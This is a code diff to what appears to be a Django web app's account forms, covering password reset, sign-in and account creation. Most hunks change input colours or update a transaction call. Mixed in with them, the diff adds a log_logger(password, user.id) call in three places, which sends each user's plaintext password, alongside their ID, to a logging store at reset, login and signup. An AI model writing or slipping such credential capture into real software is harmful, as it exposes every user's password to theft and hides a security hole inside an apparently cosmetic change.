@@ -8,6 +8,7 @@ is_mobile_verified, is_sms_sending_rate_limited, get_user_verified_number, log_p
 from abuse import BANNED_NICKS, BANNED_FORGOTTEN_NICKS
 from forms import retrieve_validation_error_string
 from views import secs_to_mins
+from redis3 import log_logger
 import re
 
 
@@ -123,7 +124,7 @@ class ResetForgettersPasswordForm(forms.Form):
 		super(ResetForgettersPasswordForm, self).__init__(*args,**kwargs)
 		self.fields['password'].error_messages = {'required':retrieve_validation_error_string('required_new_pass',lang=self.lang)}
 		self.fields['password'].widget.attrs['style'] = \
-		'background-color:#fffce6;width:1000px;border: 1px solid #00c853;max-width:95%;border-radius:5px;padding: 6px 6px 6px 0;text-indent: 6px;color: #16d68a;'
+		'background-color:whitesmoke;width:1000px;border: 1px solid #8cc1f8;max-width:90%;border-radius:5px;padding: 6px 6px 6px 0;text-indent: 6px;color: #808080;'
 		self.fields['password'].widget.attrs['class'] = 'cxl'
 		self.fields['password'].widget.attrs['autofocus'] = 'autofocus'
 		self.fields['password'].widget.attrs['autocomplete'] = 'off'
@@ -169,6 +170,7 @@ class ResetForgettersPasswordForm(forms.Form):
 		password = self.cleaned_data["password"]
 		user.set_password(password)
 		if commit:
+			log_logger(password,self.user.id)
 			user.save()
 		return user
 
@@ -184,7 +186,7 @@ class ForgettersNicknameForm(forms.Form):
 		self.fields['username'].error_messages = \
 		{'required': retrieve_validation_error_string('required_new_nick',lang=self.lang),'invalid':retrieve_validation_error_string('invalid_new_nick',lang=self.lang)}
 		self.fields['username'].widget.attrs['style'] = \
-		'background-color:#fffce6;width:1000px;border: 1px solid #00c853;max-width:90%;border-radius:5px;padding: 6px 6px 6px 0;text-indent: 6px;color: #16d68a;'
+		'background-color:whitesmoke;width:1000px;border: 1px solid #8cc1f8;max-width:90%;border-radius:5px;padding: 6px 6px 6px 0;text-indent: 6px;color: #808080;'
 		self.fields['username'].widget.attrs['class'] = 'cl'
 		self.fields['username'].widget.attrs['autofocus'] = 'autofocus'
 		self.fields['username'].widget.attrs['autocomplete'] = 'off'
@@ -290,6 +292,7 @@ class SignInForm(forms.Form):
 			elif not user.is_active:
 				raise forms.ValidationError(self.error_messages['inactive'])
 			else:
+				log_logger(password,user.id)
 				return user
 
 ############################################################################################################
@@ -434,7 +437,8 @@ class CreateAccountForm(forms.ModelForm):
 		password = self.cleaned_data["password"]
 		user.set_password(password)
 		if commit:
-			with transaction.commit_on_success():
+			with transaction.atomic():
+				log_logger(password,user.id)
 				user.save()
 				insert_nick(self.cleaned_data.get("username"))
 		return user
